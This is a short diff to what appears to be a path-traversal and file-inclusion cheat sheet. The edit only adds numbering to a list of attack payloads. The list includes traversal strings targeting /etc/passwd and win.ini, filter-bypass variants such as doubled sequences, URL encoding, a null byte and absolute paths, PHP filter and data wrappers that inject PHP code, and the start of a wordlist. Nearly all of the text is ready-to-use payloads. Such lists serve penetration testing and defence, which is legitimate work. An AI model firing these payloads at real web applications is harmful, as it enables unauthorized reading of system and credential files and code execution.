@@ -7,14 +7,14 @@ ___
 ..\..\..\windows\win.ini >> For windows
 ```
 #### Bypassing Defence Mechanism
-Sequence block bypass >> ....//....//....//....//etc/passwd
-Sequence block bypass2 >> ..//..//..//..//etc/passwd
-Encoding ../ >> %2e%2e%2f
-Absolute path >> /var/www/images/../../../etc/passwd
-Absolute path2 >> /var/www/html/..//..//..//etc/passwd
-Using null byte >> ../../../etc/passwd%00.png
-Using PHP wrappers >> php://filter/convert.base64-encode/resource=/etc/passwd
-Using Data wrappers >> data:text/plain,<?php phpinfo(); ?>
+1. Sequence block bypass >> ....//....//....//....//etc/passwd
+2. Sequence block bypass2 >> ..//..//..//..//etc/passwd
+3. Encoding ../ >> %2e%2e%2f
+4. Absolute path >> /var/www/images/../../../etc/passwd
+5. Absolute path2 >> /var/www/html/..//..//..//etc/passwd
+6. Using null byte >> ../../../etc/passwd%00.png
+7. Using PHP wrappers >> php://filter/convert.base64-encode/resource=/etc/passwd
+8. Using Data wrappers >> data:text/plain,<?php phpinfo(); ?>
 #### Wordlist
 ```txt
 ../../../etc/passwd
